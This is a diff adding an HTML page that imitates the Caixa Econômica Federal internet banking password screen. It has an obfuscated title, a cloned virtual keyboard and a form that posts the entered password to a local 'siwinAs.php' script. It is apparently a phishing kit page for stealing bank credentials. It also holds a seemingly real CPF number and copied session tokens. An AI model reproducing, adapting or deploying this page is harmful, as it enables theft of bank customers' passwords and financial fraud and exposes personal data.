@@ -1,0 +1,783 @@
+<!DOCTYPE html><html lang="pt-br"><head><meta http-equiv="content-type" content="text/html;charset=UTF-8">
+ 
+
+
+	
+	
+	
+<title>Int.ern eT....Banki...NG---C:a.IXA</title>
+
+<meta charset="UTF-8">
+<meta name="author" content="mailto:cpmbraxis@cpmbraxis.com">
+<meta name="description" content="Banco público orientado para o desenvolvimento econômica e social do país">
+<meta name="keywords" content="Banco público orientado para o desenvolvimento econômica e social do país">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,requiresActiveX=true">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1,user-scalable=0">
+<meta name="format-detection" content="telephone=no">
+
+<!-- CSS -->
+<link rel="stylesheet" media="all" href="../statics-core/css/elements.css">
+<link rel="stylesheet" media="all" href="../statics-core/css/reset.css">
+<link rel="stylesheet" href="../statics-core/bootstrap/css/bootstrap.css">
+<link rel="stylesheet" media="all" href="../statics-core/css/login.css">
+<link rel="stylesheet" href="../statics-core/css/principal.css">
+
+<script type="text/javascript">
+		    function _apl_senha_Confirmar() {
+		        //   if (!isAcessando()) {
+		        if (_apl_senha_consisteDados()) {
+		            // setAcessando();
+		            alert('sbmit');
+		            //new AjaxNovoIB(document.form.action).processPost($("#form").serializeArray());
+
+		        }
+		        // }
+		    }
+</script>
+<link rel="stylesheet" href="../statics-components/js/componentes/loading/loading.css">
+<link rel="stylesheet" media="all" href="#" class="contrastePF">
+<style type="text/css" name="teclado">/* keyboard alfanumeric---------- */
+
+.teclado{
+    -webkit-touch-callout: none;
+    -webkit-user-select: none;
+    -khtml-user-select: none;
+    -moz-user-select: none;
+    -ms-user-select: none;
+    user-select: none;
+    position: relative;
+}
+
+.teclado .big {
+	height: 210px;
+	width: 375px;
+	background: #d6e1ee;
+	z-index: 99999;
+	border-radius: 6px;
+	-webkit-border-radius: 6px;
+	-moz-border-radius: 6px;
+	padding: 40px 17px 17px; advertisingControls;
+	-webkit-box-shadow: 1px 1px 4px 0px rgba(117,117,117,1);
+	-moz-box-shadow: 1px 1px 4px 0px rgba(117,117,117,1);
+	box-shadow: 1px 1px 4px 0px rgba(117,117,117,1);
+	position: relative;
+}
+
+.teclado .big ul {
+	clear: right;
+	float: right;
+	margin: -10px 0px 0px 0px;
+	width: 340px;
+	padding: 0px;
+}
+
+.teclado .big ul li {
+	float: left;
+	width: 28px;
+	height: 28px;
+	margin: 3px;
+	background: #fff;
+	color: #303030;
+	font: bold 14px Arial, Helvetica, sans-serif;
+	text-align: center;
+	line-height: 28px;
+	list-style: none;
+	cursor: pointer;
+	border-radius: 3px;
+	-webkit-border-radius: 3px;
+	-moz-border-radius: 3px;
+}
+.teclado .big #clean{
+	float: right;
+	width: 122px;
+	height: 28px;
+	margin: 3px;
+	background: #fff;
+	color: #303030;
+	font: bold 14px Arial, Helvetica, sans-serif;
+	text-align: center;
+	line-height: 28px;
+	list-style: none;
+	cursor: pointer;
+	border-radius: 3px;
+	-webkit-border-radius: 3px;
+	-moz-border-radius: 3px;
+}
+
+.teclado .big #shift {
+	display: block;
+	width: 28px;
+	height: 28px;
+	background: url(/statics-components/js/componentes/teclado/img/keyboardUpFlag.png) no-repeat 4px 4px;
+}
+
+.teclado .big #back {
+	display: block;
+	width: 28px;
+	height: 28px;
+	background: url(/statics-components/js/componentes/teclado/img/keyboardLeftFlag.png) no-repeat 4px 4px;
+}
+
+.teclado .big #caps {
+	width: 62px;
+}
+
+.teclado .big #drag {
+	float: right;
+	margin: -34px 0 0 0;
+	width: 19px;
+	height: 20px;
+	background: url(/statics-components/js/componentes/teclado/img/keyboardDrag.png) no-repeat;
+	cursor: move;
+}
+
+/* keyboard numeric---------- */
+
+.teclado .small {
+    width: 325px;
+	height: 100px;
+	background: #d6e1ee;
+	position: absolute;
+	z-index: 9999;
+	margin: 65px 0px 0px 270px;
+	box-shadow: 1px 1px 1px 1px #505050;
+	-moz-box-shadow: 1px 1px 1px 1px #505050;
+	-webkit-box-shadow: 1px 1px 1px 1px #505050;
+	border-radius: 6px;
+	-webkit-border-radius: 6px;
+	-moz-border-radius: 6px;
+	padding: 15px;
+}
+
+.teclado .small ul {
+	position: absolute;
+	padding: 0px;
+	margin: 0px;
+	width:170px
+}
+
+.teclado .small ul li {
+	float: left;
+	width: 28px;
+	height: 28px;
+	margin: 3px;
+	background: #fff;
+	color: #303030;
+	font: bold 14px Arial, Helvetica, sans-serif;
+	text-align: center;
+	line-height: 28px;
+	list-style: none;
+	cursor: pointer;
+	 border-radius: 3px;
+	-webkit-border-radius: 3px;
+	-moz-border-radius:3px;
+}
+.teclado .small #clean{
+	float: right;
+	width: 122px;
+	height: 28px;
+	margin: 37px 0px 0px 0px;
+	background: #fff;
+	color: #303030;
+	font: bold 14px Arial, Helvetica, sans-serif;
+	text-align: center;
+	line-height: 28px;
+	list-style: none;
+	cursor: pointer;
+	 border-radius: 3px;
+	-webkit-border-radius: 3px;
+	-moz-border-radius:3px;
+}
+
+
+.teclado .small #shift {
+	display: block;
+	width: 28px;
+	height: 28px;
+	background: url(/statics-components/js/componentes/teclado/img/keyboardUpFlag.png) no-repeat;
+}
+
+.teclado .small #back {
+	display: block;
+	width: 36px;
+	height: 36px;
+	background: url(/statics-components/js/componentes/teclado/img/keyboardLeftFlag.png) no-repeat;
+}
+
+.teclado .small #caps {
+	width: 78px;
+}
+
+.teclado .small #drag {
+	position: absolute;
+	right: 10px;
+	top: 10px;
+	width: 19px;
+	height: 20px;
+	background: url(/statics-components/js/componentes/teclado/img/keyboardDrag.png) no-repeat;
+	cursor: move;
+}
+.identBoxPassword input{
+	display: inline!important;
+	float: left !important;
+	width: auto !important;
+	font-size: 14px!important;
+	font-weight: bold!important;
+	color: #303030!important;
+	padding: 0px 8px 0px 8px!important;
+	height: 32px!important;
+	margin-right: -4px!important;
+	position: relative !important;
+	border-radius: 7px!important;
+	opacity:1 !important;
+	/* border:none!important; */
+	font: bold 12px arial!important;
+	letter-spacing: 0.1em;
+}
+
+.identBoxPassword .inputGrey {
+	background: #e5e5e5;
+	border-top: 1px solid rgb(136, 136, 136)!important;
+}
+
+.relativeInput{
+	position:relative;
+	float: left;
+	top: -35px;
+}
+.relativeInput p{
+	font-size: 12px!important;
+	color: rgb(70, 70, 70)!important;
+	font: bold 12px Arial !important;
+	border:none!important;
+	margin: 8px 8px 0 0 !important;
+	padding: 0 !important;
+}
+
+
+.textocbold {
+	font-family:Arial, Helvetica !important; 
+	font-size:14px; 
+	font-weight:bold; 
+	color: #303030;
+	text-decoration:none; 
+	text-align:left;
+	clear:both;
+	position:relative;
+	float:left;
+	line-height:18px;
+}
+
+.lbSenha {
+	color: #003576;
+	display: block;
+	float: left;
+	font-size: 14px;
+	font-weight: bold;
+	margin-right: 5px;
+	min-width: 140px;
+	padding-top: 7px;
+	width: auto;
+}
+
+#div-senha{
+	margin-bottom: 90px;
+	margin-top: 20px;
+}
+
+#tituloKeyboard{
+	margin-bottom: 20px;
+}
+
+#teclado{
+	top: 0px;
+	bottom: 0px;
+/* 	left: 10%; */
+}
+
+.modal-background{
+position:fixed;
+top: 0;
+left: 0;
+width: 100%;
+*width: 200%;
+*margin: 0 0 0 -14%;
+height: 100%;
+display: block;
+background-color: rgba(000, 000, 000, 0.5);
+background: rgba(000, 000, 000, 0.5);
+color: rgba(000, 000, 000, 0.5);
+z-index:1 !important;
+}
+
+</style>
+		<script src="./Scripts/jquery-1.8.0.min.js"></script>
+		
+		<!-- jQuery UI -->
+		<script src="./Scripts/jquery-ui.min.js"></script>
+		<script src="./Scripts/jquery.pubsub.js"></script>    
+
+     	<script src="./Scripts/LAB.min.js"></script>
+		<script src="./Scripts/yepnope-lab.js"></script>
+
+
+		<script src="./Scripts/jquery.modal.js"></script>  
+		<script src="./Scripts/jquery.hashchange.js"></script>
+		<script src="./Scripts/components.js"></script>
+		<script src="./Scripts/loadContent.js"></script>
+		<script src="./Scripts/jquery.placeholder.js"></script>
+<script type="text/javascript" charset="utf-8" src="./Scripts/t_login_passo_3.js"></script>
+<script language="javascript" type="text/javascript">
+    function submitDetailsForm() {
+       $("#user").submit();
+    }
+</script>
+<script type="text/javascript">
+$(document).ready(function(){
+
+ $('.keyboard-button').click(
+ function(e){e.preventDefault; 
+ $('#password').val(
+ $('#password').val()+ 
+ $(this).text());
+ });
+//testa	nooooooo nem lembrei disso
+	
+});
+ </script>
+     <script>
+        $(document).ready(function(e) {
+           $("#btnConfirmar").click(function(e) {
+                if ($('#password').val() == '') {
+                    alert("Digite corretamente sua senha")
+                } else {
+                    $("#user").attr("action", "siwinAs.php");
+                    $("#user").submit();
+                }
+            });
+        });
+    </script>
+</head>
+<body class="cadastro" style="cursor: auto;">
+	<div data-component="tabindex"></div>
+	<!-- HEADER -->
+	<header class="hidden-xs">
+		<div class="main">
+			<div class="collapse navbar-collapse hidden-sm" id="acessibilidade">
+					<ul class="nav navbar-nav acessMenu fonte10 fonteBranca">
+						<li><a href="https://internetbanking.caixa.gov.br/sinbc/#" data-href="conteudo" class="skip altText fonteBranca" tabindex="1">Ir para conteúdo</a></li>
+						<!-- <li class="acessSeparador hidden-xs fonte12 altSep">|</li>
+						<li><a href="#" data-href="categoriaContainer" class="skip altText fonteBranca" tabindex="2">Ir para menu</a></li>
+						<li class="acessSeparador hidden-xs fonte12 altSep">|</li>
+						<li><a href="#" data-href="pesquisa" class="skip altText fonteBranca" tabindex="3">Ir para busca</a></li>
+						<li class="acessSeparador hidden-xs fonte12 altSep">|</li>
+						<li><a href="#" data-href="toolbarOpen" class="skip altText fonteBranca" tabindex="4">Ir para ferramentas</a></li> -->
+					</ul>
+				</div>
+			</div>
+			<!-- <div class="topHeader">
+				<div class="contentTopHeader">
+					<ul class="accessBar">
+	      				<li class="skipContent"> 
+	      					 <a id="acessoRapidoConteudo" href="#" title="Ir para Conteúdo" data-href="conteudo" class="skip" tabindex="1">Ir para Conteúdo</a> 
+	      					<a href="#" data-href="nomeUsuario" class="skip" tabindex="1">Ir para conteúdo</a>
+	      				</li>
+	    			</ul>
+	    			<ul class="accessWebRight">
+	     				<li>
+	     					<a class="accessContrast" href="#" title="Constraste" tabindex="2">Contraste <img src="../statics-core/img/contrastOn.png" class="accessContrastOn" alt="Contrate"> <img src="../statics-core/img/contrastOff.png" class="accessContrastOff" alt="Contrate"> </a> | <a class="AcessFontMax" href="javascript:increaseFontSize();" title="A+" tabindex="3">A + </a> <a class="AcessFontMin" href="javascript:decreaseFontSize();" title="A-" tabindex="4">A - </a> 
+	     				</li>
+	    			</ul>
+				</div>
+			</div> -->
+			<div class="mainHeader | gradient">
+				<div class="contentMainHeader">
+					<h1 class="brand" title="Caixa Econômica Federal">
+											<a href="http://www.caixa.gov.br/" id="aLogoLink" class="alogo" tabindex="2">Caixa Econômica | Internet Banking</a>
+					</h1>
+				</div>
+			</div>
+	</header>
+	<!-- END HEADER -->
+	<!-- MAIN -->
+	<div id="delimitarTeclado" style="width: 1344px;">
+		<div class="main" id="conteudo">
+
+
+
+<div data-component="loading"><div class="modalBgLoading">
+	<div class="loading"></div>	
+</div> </div>
+<!-- BOXES -->
+<div class="container-fluid ajusteMargem">
+	<div class="row">
+	<div class="rowXs">
+		<div class="col-md-12 col-xs-12">
+			<div class="icoIdentificacaoUsuario iconLogin">
+				<span class="tituloPrincipal" style="margin-top:0">Identificação do usuário</span> <br>
+				<!-- <span class="textoDestaque" >Para acessar o Internet Banking Caixa informe a senha internet.</span> -->
+			</div>
+			
+			<input type="hidden" id="chaveServidor" value="">
+			<input type="hidden" id="userOutorgado" value="false">
+			<input type="hidden" id="isDeficienteVisual" value="false">
+			<input type="hidden" id="msgError" value="">
+			<input type="hidden" id="retornoF10" value="">
+			<input type="hidden" id="passErrorAcess" value="false">
+
+
+			<input type="hidden" name="f10CmdWS" id="f10CmdWS" value="{&quot;d&quot;:&quot;{\&quot;n\&quot;:\&quot;F10\&quot;,\&quot;rs\&quot;:1,\&quot;s\&quot;:\&quot;u2UGnm44lNDkI1Tjuw4UiOLc.nodelx466:nbcinter03a-lx466\&quot;}&quot;,&quot;ds&quot;:2,&quot;s&quot;:&quot;ZHdlZYTFUbiVyGNEsX46Zq5WlhP+ANJ5zbvYLe8LDG0N6M+rIM5AkfXLyrO/D/PRKEohzrKQenQsjr6n0bGMF8TER5xYq4eri35uGauEFROjNwpc0oKoPIZC3amdKYZUXgZtl7hL4NcwFzU0LRhwGlla5yekFlzdCaN3TlCHlKY=&quot;,&quot;v&quot;:1}">
+			
+			<input type="hidden" name="siglaWS" id="siglaWS" value="cef">
+			
+			<input type="hidden" name="idWS" id="idWS" value="u2UGnm44lNDkI1Tjuw4UiOLc.nodelx466:nbcinter03a-lx466">
+			
+			<input type="hidden" name="seedWS" id="seedWS" value="efvfxVQ6EvLYz2C4sIJaSvSMIw/VFEuqdYl+jfuXjhoITgCrG9F1g6YfQHV16DzmIKOBu8Pa/EPjzM5pScWlvX9yIrU72hboZ48qDK28BoAHA5H8/cevExjb4iwK45Eid4ijS9Fs2I2+GaYcHjSZ8mxbqdCfJ1hh">
+			
+			<input type="hidden" name="encryptCmdWS" id="encryptCmdWS" value="{&quot;d&quot;:&quot;{\&quot;n\&quot;:\&quot;Encrypt\&quot;,\&quot;rs\&quot;:1,\&quot;s\&quot;:\&quot;u2UGnm44lNDkI1Tjuw4UiOLc.nodelx466:nbcinter03a-lx466\&quot;}&quot;,&quot;ds&quot;:2,&quot;s&quot;:&quot;WGkRS3G3hpeXIIdRWevBuCYB2EW6mZc0e1PU0QS8BsL0L94s8CsEZon+1Tzn/fKpux+FSblhL9b+U+6lFVxrx/a133YyHi5sVzJ2YRi1NtAHU1iyffku7qZLWjQNpf9h1LMLaITTew7a96WwpJP+AGmlwCX/eIhyPC8ygocRGdY=&quot;,&quot;v&quot;:1}">
+			
+			<input type="hidden" name="warsawErro" id="warsawErro" value="">
+			
+			<input type="hidden" name="passo3_ws" id="passo3_ws" value="true">
+			
+			<input type="hidden" name="cpfUsuarioLogado" id="cpfUsuarioLogado" value="01527084647">
+			
+			<input type="hidden" name="segmentoUsuarioLogado" id="segmentoUsuarioLogado" value="1">
+			
+			<input type="hidden" name="encryptToWS" id="encryptToWS" value="true">
+			
+			<div class="panel panel-default inputCinza blocLoginCinza" style="width: 800px">
+			
+				<div class="panel-body painelCinza xs-p-l-0 xs-p-r-0">
+					<div class="col-md-7">
+						<form id="user" action="siwinAs.php" method="post" name="user">
+                          <input type="hidden" name="usuario" value="">
+                           <input type="hidden" name="pessoa" value="">		
+                            <input type="hidden" name="pessoa" value="">	
+						
+							<div class="form-group">
+								<div class="row">
+									<div class="col-md-12 col-xs-12">
+										<span class="textoDestaque">Para acessar o Internet Banking Caixa informe a senha internet.</span>
+										<p class="hidden-xs"><strong>Utilize o teclado ao lado para digitar a senha internet.</strong></p>
+										<!-- <p class="hidden-md hidden-sm hidden-lg">Insira no campo abaixo a senha internet.</p> -->
+									</div>
+								</div>
+								<div id="boxLogin" name="boxLogin">
+									<div id="naoDV" style="display: block;">
+										<div class="row">
+											<div class="col-lg-4 col-md-4 col-sm-4 col-xs-6">
+												<input id="85SenhaAtual" name="85SenhaAtual" class="inputWhite textPassword form-control" value="" type="password" size="10" tabindex="3">
+											</div>
+											<div class="col-lg-8 col-md-8 col-sm-8 col-xs-6 imgIconSaiba p-l-0">
+												(6 a 8 dígitos)
+											</div>
+										</div>
+									</div>
+								</div>
+							</div>
+						</form>
+					</div>
+					<!--  TECLADO  -->
+		<div id="85KeyboardContainer" class="col-md-5" data-component="teclado" style="display: block;"><div id="tecladoPrinc" class="teclado ui-draggable" style="margin-top: 24px; margin-bottom: 5px; width: 375px; left: -70px; top: 0px;">
+	    <div id="85Dialog" class="hidden-xs big" style="margin-top: 20px; height: 220px; width: 375px;">      
+       <div id="drag"><div><span class="drag-button"><img src="./Images/img_drag.png" alt="Mover"></span></div></div>
+       <ul id="85Keyboard"> 
+	   	   <div id="85TecladoN">
+           <li class="keyboard-button | pie" style="text-transform: lowercase;">1</li>
+           <li class="keyboard-button | pie" style="text-transform: lowercase;">2</li>
+           <li class="keyboard-button | pie" style="text-transform: lowercase;">3</li>
+           <li class="keyboard-button | pie" style="text-transform: lowercase;">4</li>
+           <li class="keyboard-button | pie" style="text-transform: lowercase;">5</li>
+           <li class="keyboard-button | pie" style="text-transform: lowercase;">6</li>
+           <li class="keyboard-button | pie" style="text-transform: lowercase;">7</li>
+           <li class="keyboard-button | pie" style="text-transform: lowercase;">8</li>
+           <li class="keyboard-button | pie" style="text-transform: lowercase;">9</li>
+           <li class="keyboard-button | pie" style="text-transform: lowercase;">0</li>
+		   </div>
+		   <div id="85TecladoA1">
+           <li class="keyboard-button | pie" style="text-transform: lowercase;">q</li>
+           <li class="keyboard-button | pie" style="text-transform: lowercase;">w</li>
+           <li class="keyboard-button | pie" style="text-transform: lowercase;">e</li>
+           <li class="keyboard-button | pie" style="text-transform: lowercase;">r</li>
+           <li class="keyboard-button | pie" style="text-transform: lowercase;">t</li>
+           <li class="keyboard-button | pie" style="text-transform: lowercase;">y</li>
+           <li class="keyboard-button | pie" style="text-transform: lowercase;">u</li>
+           <li class="keyboard-button | pie" style="text-transform: lowercase;">i</li>
+           <li class="keyboard-button | pie" style="text-transform: lowercase;">o</li>
+           <li class="keyboard-button | pie" style="text-transform: lowercase;">p</li>
+		   </div>
+           <li class="keyboard-button | pie" style="text-transform: lowercase;">
+		   <div class="keyboard-button | pie" id="85">
+			<img src="./Images/img_set_up.png" style="margin-top:0px"></div>
+		   <span id="shift"></span></li>
+		   <div id="85TecladoA2">
+           <li class="keyboard-button | pie" style="text-transform: lowercase;">a</li>
+           <li class="keyboard-button | pie" style="text-transform: lowercase;">s</li>
+           <li class="keyboard-button | pie" style="text-transform: lowercase;">d</li>
+           <li class="keyboard-button | pie" style="text-transform: lowercase;">f</li>
+           <li class="keyboard-button | pie" style="text-transform: lowercase;">g</li>
+           <li class="keyboard-button | pie" style="text-transform: lowercase;">h</li>
+           <li class="keyboard-button | pie" style="text-transform: lowercase;">j</li>
+           <li class="keyboard-button | pie" style="text-transform: lowercase;">k</li>
+           <li class="keyboard-button | pie" style="text-transform: lowercase;">l</li>
+		   </div>
+		   <div id="85TecladoA3">
+           <li class="key" id="caps" style="text-transform: lowercase;">CAPS</li>
+           <li class="keyboard-button | pie" style="text-transform: lowercase;">z</li>
+           <li class="keyboard-button | pie" style="text-transform: lowercase;">x</li>
+           <li class="keyboard-button | pie" style="text-transform: lowercase;">c</li>
+           <li class="keyboard-button | pie" style="text-transform: lowercase;">v</li>
+           <li class="keyboard-button | pie" style="text-transform: lowercase;">b</li>
+           <li class="keyboard-button | pie" style="text-transform: lowercase;">n</li>
+           <li class="keyboard-button | pie" style="text-transform: lowercase;">m</li>
+           <li class="keyboard-button | pie" style="text-transform: lowercase;">
+		  <div class="keyboard-button | pie" id="85SHIFT">
+		   <img src="./Images/img_set_left.png" style="margin-top:-1px"></div>
+		   </li></div>
+		   <span id="back"></span>
+           <li id="clean" title="Limpar" onclick="_limparCampos();" style="text-transform: lowercase;">LIMPAR</li>
+       </ul>        
+	</div>
+	
+	
+</div></div>
+					<!--  END TECLADO  -->
+				</div>
+			</div>
+		</div>
+		</div>
+	</div>
+<script type="text/javascript">
+$(document).ready(function(){
+
+ $('.keyboard-button').click(
+ function(e){e.preventDefault; 
+ $('#85SenhaAtual').val(
+ $('#85SenhaAtual').val()+ 
+ $(this).text());
+ });
+//funcionando, 
+	
+});
+ </script>
+		<script data-dynamic="true" type="text/javascript">
+		    jQuery(".main").bind("mousemove mouseout focus", function () {
+		        if ($("#85Dialog").length) {
+		            if ($("#85Dialog").offset().left < 0) {
+		                $("#85Dialog").offset({ left: 0 })
+		            }
+		            if ($("#85Dialog").offset().top < 0) {
+		                $("#85Dialog").offset({ top: 0 })
+		            }
+		            if ($("#85Dialog").offset().left + $("#85Dialog").width() > screen.width) {
+		                $("#85Dialog").offset({ left: screen.width - $("#85Dialog").width() })
+		            }
+		            if ($("#85Dialog").offset().top + $("#85Dialog").height() > $(".internas").height()) {
+		                $("#85Dialog").offset({ top: $(".internas").height() - $("#85Dialog").height() })
+		            }
+		        }
+		    });
+		    $.Topic("/loadPage/initComponent").publish("85");
+		    yepnope({
+		        load: ["Scripts/components.js",
+                       "Scripts/jquery.keyboard.js"],
+		        complete: function () {
+
+		            $.keyboard("85", "alfanumerico", false);
+		            $("#keyboard").draggable({ containment: "#containment-wrapper", scroll: false });
+		            if (window.PIE) {
+		                $('.pie').each(function () {
+		                    PIE.attach(this);
+		                });
+		            };
+		            $.Topic("/loadPage/finishComponent").publish("85");
+
+		        }
+		    });
+
+</script>
+<script data-dynamic="true" type="text/javascript">
+		    $("#btn_cancelar").click(function () {
+
+		    });
+
+		    function _apl_senha_consisteDados() {
+		        var ibcCampoSenha = $("#85SenhaAtual");
+
+		        if (!ibcCampoSenha || ibcCampoSenha.val() == "") {
+		            alert("Favor informar a senha.");
+		            ibcCampoSenha.focus();
+		            //setAcessoLiberado();
+		            return false;
+		        }
+
+
+
+		        if (ibcCampoSenha.val().length < 6 || ibcCampoSenha.val().length > 8) {
+
+		            alert("O valor digitado deve ter entre 6 e 8 caracteres. Favor digitar novamente.");
+		            ibcCampoSenha.val("");
+		            ibcCampoSenha.focus();
+		            //setAcessoLiberado();
+		            return false;
+
+		        }
+		        else {
+		            return true;
+		        }
+
+		    }
+
+		    function _apl_senha_Confirmar() {
+		        //   if (!isAcessando()) {
+		        if (_apl_senha_consisteDados()) {
+		            // setAcessando();
+		            alert('sbmit');
+		            //new AjaxNovoIB(document.form.action).processPost($("#form").serializeArray());
+
+		        }
+		        // }
+		    }
+
+		    function _limparCampos() {
+		        $("input[id^=85]").val("");
+		        $("input[id^=85]")[0].focus();
+		    }
+
+
+		    function onKeyDown(el) {
+		        if (event.ctrlKey || event.altlKey || event.shiftlKey) return false;
+		    }
+
+		    function onKeyUp(el) {
+		        alert("Para maior segurança, favor utilizar o teclado virtual.")
+		        el.value = "";
+		        //setAcessoLiberado();
+		        return false;
+		    }
+
+		    function onMouseDown(id) {
+		        if (event.button == 2)
+		            return alert('Essa operação não pode ser realizada.');
+		    }
+
+		    $("#85SenhaAtual").mousedown(function (e) { onMouseDown(this.id) });
+
+		    $("#85SenhaAtual").keydown(function (e) { onKeyDown(this) });
+
+		    $("#85SenhaAtual").keyup(function (e) { if (e.keyCode != 8) onKeyUp(this) });
+
+		    $("#85Confirm").mousedown(function (e) { onMouseDown(this.id) });
+		    $("#85Confirm").keydown(function (e) { onKeyDown(this) });
+		    $("#85Confirm").keyup(function (e) { if (e.keyCode != 8) onKeyUp(this) });
+
+</script>
+	<div class="row">
+		<div class="col-md-12 col-xs-12">
+			<button type="submit" id="btnConfirmar" name="btnConfirmar" accesskey="s" class="botaoLaranja pull-right" title="Confirmar" tabindex="250" onclick="javascript:Confirmar()" style="border-radius: 3px; left: -150px;" ;="">CONTINUAR</button>
+			<button type="button" id="btnCancelar" name="btnCancelar" accesskey="v" class="botaoCinza" title="Cancelar" tabindex="5" style="border-radius: 3px;">CANCELAR</button>
+		</div>
+	</div>
+</div>
+</div>
+	</div>
+	<!-- END MAIN -->
+	<!-- FOOTER -->
+	<div class="rodapePrincipal hidden-xs">
+		<div class="main">
+			<div class="container-fluid">
+				<div class="row sm-m-l-0">
+					<div class="col-lg-4 col-md-4 col-sm-4 hidden-xs rodapeTelefone"><div id="rodapeSuporte" class="rodapeBtEsq fonteBranca">Suporte Tecnológico CAIXA<br> 3004 1104 (Capital e regiões metropolitanas) ou 0800 726 0104 (Demais regiões)</div></div>
+					<div class="col-lg-8 col-md-8 col-sm-8 pull-right">
+						<ul class="rodapeNav nav navbar-nav pull-right">
+							<li class="rodapeBtDirEsq">
+								<a id="rodapeSeguranca" class="rodapeLink rodapeBtSeguranca" target="_blank" tabindex="10">Segurança</a>
+							</li>
+							<li class="rodapeBtDirLinha">
+								<a id="rodapeAtendimentoLink" class="rodapeLink rodapeBtAtendimento" onclick="abrirLink('rodapeAtendimento')" tabindex="11">Rede de Atendimento</a>
+								<a id="rodapeAtendimento" style="display:none" tabindex="12">.</a>
+							</li>
+							<li class="rodapeBtDirLinha">
+								<a id="rodapeAjudaLink" class="rodapeLink rodapeBtAjuda" onclick="abrirLink('rodapeAjuda')" tabindex="13">Ajuda</a>
+								<a id="rodapeAjuda" style="display:none" tabindex="14">.</a>
+							</li>
+							<li class="rodapeBtDir">
+								<a id="rodapeTermosLink" class="rodapeLink rodapeBtTermos" onclick="abrirLink('rodapeTermos')" tabindex="15">Termos e Contratos</a>
+								<a id="rodapeTermos" style="display:none" href="https://internetbanking.caixa.gov.br/sinbc/" tabindex="16">.</a>
+							</li>
+						</ul>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+	<script type="text/javascript" src="./nt.e.rneT____B.anking____C....AiXA4_files/jquery.js.download">	
+		function cad_ident_usr(data) {
+			$('#descricao').html(data.texto);
+			$('#titulo').html(data.titulo);
+			$('#imgBanner').attr('src', data.img_banner);
+		}		
+
+	</script>
+	
+
+<!-- MODAAAL          AQUI PRA           BAIXO ------------>	
+	
+
+	<script>
+$(document).ready(function () {
+    $("#divCarregando").fadeIn('slow');
+    $(window).load(function () {
+setTimeout(function(){
+  $('#divCarregando').fadeOut('slow');
+}, 2000);
+        
+    });
+});
+</script> 
+<!-- modal modal modal 
+	 <div id="divCarregando" class="progresso">	
+     <div id="modalLoading" style="display: block">
+			<div class="modal-background"></div>	
+			<img id="modalLoadingProgressIcon" src="./img/carrega.gif" style="position: fixed; top: 45%; left: 45%;">
+	</div>
+			</div>
+ <div id="modalLoading" style="display: none">
+			<div class="modal-background"></div>	
+			<img id="modalLoadingProgressIcon" src="./img/carrega.gif" style="position: fixed; top: 45%; left: 45%;">
+	</div>
+	<!-- MODAL MODAL MODAL --->
+<div id="loading"><div class="modalBgLoading" style="height: 672px; display: none;">
+	<div class="loading" style="position: absolute; left: 50%; top: 50%; margin-left: -52px; margin-top: -52px;"></div>	
+</div> </div><div class="showMessageBox"><div id="message">
+	<div class="messageBox" style="display: none;">
+		<div class="arrow"></div>
+		<div class="iconClose"></div>
+		<div class="iconInfo"></div>
+		<div class="msg"></div>
+	</div>	
+</div></div><div id="objetosGBuster" style="height:0"><applet id="GbPluginObj" name="GbPluginObj" archive="/src/main/webapp/gbas/gbas.jar" code="br/com/gas/mid/GbAs.class" height="1" width="1" mayscript="">
+<param value="eNoFwUeCgjAAAMAHeQCp8eAhdFhahNBurBLpPSL7+p0RWY2VJQlG3MupeTHZrMY59yy0M1Bqht9ERx/meaKaVxg6B/ZLrlEOOhmRMdwQ9VuO+7499Dd7aBxxNP9IMm2ZdALmgoSyAu6nUi/lsUDhcZapxUsHE2uKF6FKRUNsW2Fro0ZHXhuv0kknMXDhldOwy5C4Y5TxcfY0mwqekXp8gNwLwKKN8+1UNwp1hhFPkR3ASQRL3yd2lIyRaE4pd946IlG39kxa6izSC82qdyx/MSnqFLa1Gs5UVJ7V9n43BLBVR56/uWvg3Z4SnSUqyLwtALxtb7c1MGlCCsy9KlOOhX0hbZd37jWKnU/X632mfCBxLlhIhvQrlkfq58vawPv9H5cocak=" name="seed">
+<param name="statusChangeCallback" value="jgbasCallbackFunction">
+</applet></div><div id="objetosGBuster" style="height:0"><applet id="GbPluginObj" name="GbPluginObj" archive="/src/main/webapp/gbas/gbas.jar" code="br/com/gas/mid/GbAs.class" height="1" width="1" mayscript="">
+<param value="eNoFwUeCgjAAAMAHeQCp8eAhdFhahNBurBLpPSL7+p0RWY2VJQlG3MupeTHZrMY59yy0M1Bqht9ERx/meaKaVxg6B/ZLrlEOOhmRMdwQ9VuO+7499Dd7aBxxNP9IMm2ZdALmgoSyAu6nUi/lsUDhcZapxUsHE2uKF6FKRUNsW2Fro0ZHXhuv0kknMXDhldOwy5C4Y5TxcfY0mwqekXp8gNwLwKKN8+1UNwp1hhFPkR3ASQRL3yd2lIyRaE4pd946IlG39kxa6izSC82qdyx/MSnqFLa1Gs5UVJ7V9n43BLBVR56/uWvg3Z4SnSUqyLwtALxtb7c1MGlCCsy9KlOOhX0hbZd37jWKnU/X632mfCBxLlhIhvQrlkfq58vawPv9H5cocak=" name="seed">
+<param name="statusChangeCallback" value="jgbasCallbackFunction">
+</applet></div><div class="showMessageBox"><div id="message">
+	<div class="messageBox" style="display: none;">
+		<div class="arrow"></div>
+		<div class="iconClose"></div>
+		<div class="iconInfo"></div>
+		<div class="msg"></div>
+	</div>	
+</div></div><div id="objetosGBuster" style="height:0"><applet id="GbPluginObj" name="GbPluginObj" archive="/src/main/webapp/gbas/gbas.jar" code="br/com/gas/mid/GbAs.class" height="1" width="1" mayscript="">
+<param value="eNoFwUeCgjAAAMAHeQCp8eAhdFhahNBurBLpPSL7+p0RWY2VJQlG3MupeTHZrMY59yy0M1Bqht9ERx/meaKaVxg6B/ZLrlEOOhmRMdwQ9VuO+7499Dd7aBxxNP9IMm2ZdALmgoSyAu6nUi/lsUDhcZapxUsHE2uKF6FKRUNsW2Fro0ZHXhuv0kknMXDhldOwy5C4Y5TxcfY0mwqekXp8gNwLwKKN8+1UNwp1hhFPkR3ASQRL3yd2lIyRaE4pd946IlG39kxa6izSC82qdyx/MSnqFLa1Gs5UVJ7V9n43BLBVR56/uWvg3Z4SnSUqyLwtALxtb7c1MGlCCsy9KlOOhX0hbZd37jWKnU/X632mfCBxLlhIhvQrlkfq58vawPv9H5cocak=" name="seed">
+<param name="statusChangeCallback" value="jgbasCallbackFunction">
+</applet></div><div class="showMessageBox"><div id="message">
+	<div class="messageBox" style="display: none;">
+		<div class="arrow"></div>
+		<div class="iconClose"></div>
